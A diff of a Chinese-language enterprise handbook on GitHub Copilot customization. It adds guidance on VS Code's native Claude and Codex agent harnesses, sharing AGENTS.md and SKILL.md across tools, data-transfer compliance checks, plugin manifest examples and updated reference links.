-> 企業team若同時使用 GitHub Copilot 與 Claude Code，下表協助建立共同語言。**相同概念不代表相同實作**，尤其事件名稱、Frontmatter 欄位、觸發時機都可能不同。
+> 企業團隊若同時使用 GitHub Copilot 與 Claude Code，下表協助建立共同語言。**相同概念不代表相同實作**，尤其事件名稱、Frontmatter 欄位、觸發時機都可能不同。
 
 | GitHub Copilot | Claude Code | Concept | 相同/不同 |
 |---|---|---|---|
@@ -3077,6 +4032,27 @@ graph LR
 2. Skills 直接共用同一份 `SKILL.md`，放在 `.github/skills/` 或 `.claude/skills/` 其中之一，兩工具都能讀取。
 3. Agents／Hooks 分別維護各工具專屬版本，但保持**邏輯一致**（例如兩邊的 Security Agent 都遵循同一份 `security-review` Skill 定義的檢查面向）。
 
+### 33.4 VS Code 原生 Claude／Codex Harness 對跨工具標準的影響
+
+> ⚠️ 本節為第三版新增。上一版的前提是「Copilot 與 Claude Code 是兩個獨立工具，企業要在兩者之間建立橋樑」；2026-08-28 複查發現 **VS Code 已內建 Claude 與 Codex 兩種 agent harness**（見第 6.7 節），這改變了跨工具標準的設計前提。
+
+#### 三個實際改變
+
+| 改變 | 舊的假設 | 新的事實 | 對企業標準的影響 |
+|---|---|---|---|
+| **同一個 IDE 內切換廠商** | 要用 Claude 就要離開 VS Code | 在 Session Target 選 Claude harness 即可，使用 Anthropic Claude Agent SDK | 「哪些專案可以用哪家模型」必須寫進企業政策，而不是靠「沒裝那個工具」自然限制 |
+| **`CLAUDE.md` 被視為 always-on instructions** | `CLAUDE.md` 是 Claude Code 專用 | VS Code 將 `copilot-instructions.md`、`AGENTS.md`、`CLAUDE.md` 三者同列為一律載入的指令檔 | Repository 中若同時存在三份，**內容矛盾的風險大幅升高**；建議以 `AGENTS.md` 為唯一事實來源，其餘兩份只放工具特有差異 |
+| **使用者層目錄分歧** | 只要管 `~/.copilot` | Agent Host 依 harness 分別讀 `~/.copilot` 與 `~/.claude` | 企業設備檢查／離職交接清單必須同時涵蓋兩個目錄 |
+
+#### 修正後的跨工具標準建議（建議架構）
+
+1. **規則層（最高兼容）**：以 `AGENTS.md` 為唯一事實來源，`copilot-instructions.md` 與 `CLAUDE.md` 若存在，內容只寫「該工具特有」的差異，並在檔頭注明「共通規則見 `AGENTS.md`」。
+2. **能力層（次高兼容）**：維護一份 `SKILL.md`，依第 8.1 節的互通性同時供兩家 harness 使用。
+3. **角色層（需分別維護）**：`.agent.md` 與 Claude Subagent 的 frontmatter 不完全相同，仍須分別維護但邏輯對齊。
+4. **治理層（最容易漏掉）**：第 20.6 節的 Agent Sandboxing 是 **VS Code 層級**的控制，因此它對 Local／Copilot／Claude／Codex 四種 harness 的終端機指令都適用——這是企業在多廠商情境下最實用的一道統一防線。
+
+> ⚠️ **採購與法遵提醒**：在 VS Code 內使用 Claude 或 Codex harness，代表程式碼與情境資料會送往 **GitHub 以外的模型供應商**。對有資料境外傳輸限制的企業，這必須先通過采購與法遵審查，不能視為「反正都在 VS Code 裡面」而默許。
+
 ### Scenario
 
 某企業原本以為「把 Claude Code 的 Hook 設定檔複製一份給 Copilot 用」就能立即生效，結果完全沒有觸發，浪費了一整天除錯。查證後才發現兩者事件名稱不同（例如 Claude Code 某些事件名稱與 Copilot 的 `preToolUse`／`postToolUse` 對應但命名不同）。**教訓**：即使概念相同，實作細節仍需逐一查證，不可假設「複製貼上就會動」。
@@ -3085,6 +4061,8 @@ graph LR
 
 - [ ] 團隊已理解 Skills 是相容性最高的一層，Hooks 是最容易出錯的一層
 - [ ] `AGENTS.md` 已作為跨工具共用的基礎規則檔
+- [ ] 已針對 VS Code 原生 Claude／Codex harness 完成資料境外傳輸的采購與法遵審查（33.4）
+- [ ] Repository 中的 `AGENTS.md`／`copilot-instructions.md`／`CLAUDE.md` 已確認內容不相矛盾（33.4）
 - [ ] 未直接複製 Hook／Agent 設定檔跨工具使用而未驗證
 
 ---
@@ -3239,6 +4217,8 @@ curl -fsSL https://gh.io/copilot-install | bash      # macOS/Linux 安裝腳本
 export COPILOT_GITHUB_TOKEN=<token>
 
 # Plugin Marketplace
+# 注：`copilot-plugins` 與 `awesome-copilot` 已為 CLI 預註冊的 Known Marketplace，
+#      下行 add 僅在需要手動重新指定或新增自建 marketplace 時才需要
 copilot plugin marketplace add github/awesome-copilot
 copilot plugin install <plugin-name>@awesome-copilot
 copilot plugin list
@@ -3258,6 +4238,9 @@ gh aw compile
 .github/hooks/*.json                 # Hooks（須在 default branch）
 .github/prompts/*.prompt.md          # Prompt files
 .vscode/mcp.json                     # MCP（workspace）
+.github/copilot/settings.json         # Repo 層級宣告式設定（enabledPlugins、extraKnownMarketplaces）
+~/.copilot/settings.json              # 個人層級宣告式設定
+~/.copilot/agents/                    # Agent Host 個人層級 Agents
 ~/.copilot/                          # 個人層級設定
 AGENTS.md                            # 跨工具共用專案說明（支援面有限）
 ```
@@ -3301,11 +4284,22 @@ applyTo: "**/*.java"
 
 ```json
 {
+  "$schema": "https://agent-plugins.org/schemas/1.0.0/plugin.schema.json",
   "name": "my-plugin",
   "description": "說明此 Plugin 的用途",
-  "version": "1.0.0"
+  "version": "1.0.0",
+  "author": { "name": "Platform Team" },
+  "license": "MIT",
+  "extensions": {
+    "com.github.awesome-copilot": {
+      "agents": ["./agents/my-agent.md"],
+      "skills": ["./skills/my-skill/"]
+    }
+  }
 }
 ```
+
+> 內容組合寫在 `extensions.com.github.awesome-copilot`；Agent 指向 `.md` 單一檔案，Skill 指向**資料夾**且以 `/` 結尾。詳見 11.3。
 
 ### 37.7 Hook 最小範例
 
@@ -3408,6 +4402,10 @@ awesome-copilot 本身不是「魔法」，它是一座已經被社群篩選過�
 - [awesome-copilot Repository metadata（GitHub API）](https://api.github.com/repos/github/awesome-copilot)
 - [awesome-copilot Agent Skills 補充說明文件](https://github.com/github/awesome-copilot/blob/main/docs/README.skills.md)
 - [Installing and Using Plugins（Learning Hub）](https://awesome-copilot.github.com/learning-hub/installing-and-using-plugins/)
+- [Working with Canvas Extensions（Learning Hub）](https://awesome-copilot.github.com/learning-hub/working-with-canvas-extensions/)
+- [GitHub Copilot Terminology Glossary（Learning Hub）](https://awesome-copilot.github.com/learning-hub/github-copilot-terminology-glossary/)
+- [Advanced GitHub Copilot CLI 課程（Learning Hub）](https://awesome-copilot.github.com/learning-hub/advanced-copilot-cli/)
+- [Hands-on with GitHub Copilot's agents（四種介面分軌 Workshop）](https://awesome-copilot.github.com/learning-hub/copilot-workshops/)
 
 ### 40.2 GitHub Copilot 官方文件
 
@@ -3429,6 +4427,11 @@ awesome-copilot 本身不是「魔法」，它是一座已經被社群篩選過�
 - [Prompt Files](https://code.visualstudio.com/docs/agent-customization/prompt-files)
 - [Custom Agents（含 `.chatmode.md` → `.agent.md` 遷移說明）](https://code.visualstudio.com/docs/agent-customization/custom-agents)
 - [Copilot Agents 總覽](https://code.visualstudio.com/docs/copilot/agents/overview)
+- [Agent Customization Overview（含 Agent Customizations 編輯器、使用者客製化遷移、Monorepo 設定、評測擴充套件）](https://code.visualstudio.com/docs/agent-customization/overview)
+- [Customization 概念頁（客製化類型比較表、模型驅動 vs 確定性）](https://code.visualstudio.com/docs/agents/concepts/customization)
+- [Agent Harnesses（Session Target、Local／Copilot／Claude／Codex、Code Isolation、Agent Host）](https://code.visualstudio.com/docs/agents/concepts/agent-harnesses)
+- [Trust and Safety（五層控制、信任邊界、Agent Sandboxing）](https://code.visualstudio.com/docs/agents/concepts/trust-and-safety)
+- [Waza 評測框架（microsoft/waza）](https://github.com/microsoft/waza)
 
 ### 40.4 GitHub Changelog
 
@@ -3447,6 +4450,8 @@ awesome-copilot 本身不是「魔法」，它是一座已經被社群篩選過�
 - [AGENTS.md 官方網站](https://agents.md/)
 - [Linux Foundation 宣布成立 Agentic AI Foundation（AGENTS.md／MCP／goose 由 OpenAI 與 Anthropic 共同捐贈）](https://www.linuxfoundation.org/press/linux-foundation-announces-the-formation-of-the-agentic-ai-foundation)
 - [Agent Skills 開放規範](https://agentskills.io/specification)
+- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
+- [OWASP Agentic Security Initiative（對應第 2.9 節 `agent-owasp-compliance` Skill 所依據的 ASI Top 10）](https://genai.owasp.org/initiatives/#agenticsecurity)
 
 ### 40.6 2026 年資安威脅情資（呼應第 20.4 節）
 
@@ -3464,7 +4469,7 @@ awesome-copilot 本身不是「魔法」，它是一座已經被社群篩選過�
 - [Node.js 官方 Release 排程（含各版本支援週期）](https://nodejs.org/en/about/previous-releases)
 - [PowerShell 官方 Release Notes](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/what-s-new-in-powershell-70)
 
-> 本手冊所有 URL 均為查證當下（2026-08-27）實際存在且可存取之官方頁面。由於本生態系變動快速，讀者使用本手冊時應重新確認上列連結內容是否已更新，若發現內容與本手冊描述不符，請以官方最新文件為準。
+> 本手冊所有 URL 均為查證當下（2026-08-27 初版／2026-08-28 第二、三版複查）實際存在且可存取之官方頁面。由於本生態系變動快速，讀者使用本手冊時應重新確認上列連結內容是否已更新，若發現內容與本手冊描述不符，請以官方最新文件為準。
 
 ---
 
@@ -3485,6 +4490,8 @@ awesome-copilot 本身不是「魔法」，它是一座已經被社群篩選過�
 - [ ] MCP 設定檔中不含任何硬編碼 Secret（第 14 章）
 - [ ] 審查型 Agent（Security／Code Review）已確認為唯讀，無法修改程式碼（第 9 章）
 - [ ] Hook／Plugin 腳本已比照生產環境程式碼標準審查（第 13、20 章）
+- [ ] 已評估是否在 macOS／Linux 開發機器啟用 Agent Sandboxing，作為模型被攻陷後的最後一道防線（第 20.6 節）
+- [ ] 已釐清工作區、發行者、MCP Server、網域四種信任邊界的授權與撤銷方式（第 14.7、20.6 節）
 
 ### 41.3 治理 Checklist
 
@@ -3498,11 +4505,12 @@ awesome-copilot 本身不是「魔法」，它是一座已經被社群篩選過�
 
 - [ ] 已閱讀本手冊 Part I（第 1-5 章），理解核心概念與元件差異
 - [ ] 已依第 26 章 Tutorial 1-11 完成基礎操作練習
-- [ ] 已知道遇到問題時查閱第 27 章 Troubleshooting 表
+- [ ] 已知道遇到問題時查閱第 27 章 Troubleshooting 表，並依 27.2 節標準診斷流程從 Session Target 與 Agent Debug Panel 查起
 - [ ] 已知道任何安裝行為前，先查第 21 章 Security Checklist
 - [ ] 已知道本手冊內容有時效性，需定期核對第 40 章 References 中的官方連結是否有更新
+- [ ] 已知道自己目前使用的 Session Target（harness、執行環境、agent role、模型）如何切換與確認（第 6.7 節）
 
 ---
 
-*本手冊查證日期：2026-08-27。GitHub Copilot 客製化生態系變動快速，請定期依第 29 章 Upgrade Playbook 重新查證本手冊內容。*
+*本手冊查證日期：2026-08-27（初版）／2026-08-28（第二、三版複查與增修）。GitHub Copilot 客製化生態系變動快速，請定期依第 29 章 Upgrade Playbook 重新查證本手冊內容。*
 
